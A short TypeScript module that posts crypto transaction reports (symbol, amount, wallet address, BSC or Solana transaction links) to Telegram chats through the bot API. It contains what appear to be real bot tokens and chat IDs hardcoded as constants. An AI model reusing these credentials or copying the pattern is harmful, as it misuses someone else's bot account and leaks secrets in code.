
import axios from 'axios'

const BOT_TOKEN_SUCCESS = "7313913024:AAGlL9snM4BprKWjB3WBqKEzGYOWxfZOTqY";
const TELEGRAM_CHAT_ID_SUCCESS = "-1002313972313";

const BOT_TOKEN_WARNING = "7652576930:AAG7oQMZb3nzvR8tN7nHQ8Fuinoc3rhrC1A";
const TELEGRAM_CHAT_ID_WARNING = "-1002297263650";

export async function sendToTelegramSuccess(title: any, address: any, symbol: any, amount: any, hash: any, chain: string) {
    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_SUCCESS}/sendMessage`;
    const currentDate = new Date().toLocaleString('en-GB', { hour12: false });
    const getTxLink = (hash: string) => {
        if (chain === 'bsc') {
            return `*TxHash* : [view details](https://bscscan.com/tx/${hash})`;
        } else if (chain === 'solana') {
            return `*TxHash* : [view details](https://solscan.io/tx/${hash})`;
        } else {
            return `*TxHash* : ${hash}`;
        }
    };

    const message = `
*${title}* : ${currentDate}
*Symbol* : ${symbol}
*Amount* : ${amount} ${symbol}
*Address* : ${address} 
${getTxLink(hash)}
`;

    try {
        await axios.post(telegramURL, {
            chat_id: TELEGRAM_CHAT_ID_SUCCESS,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
}

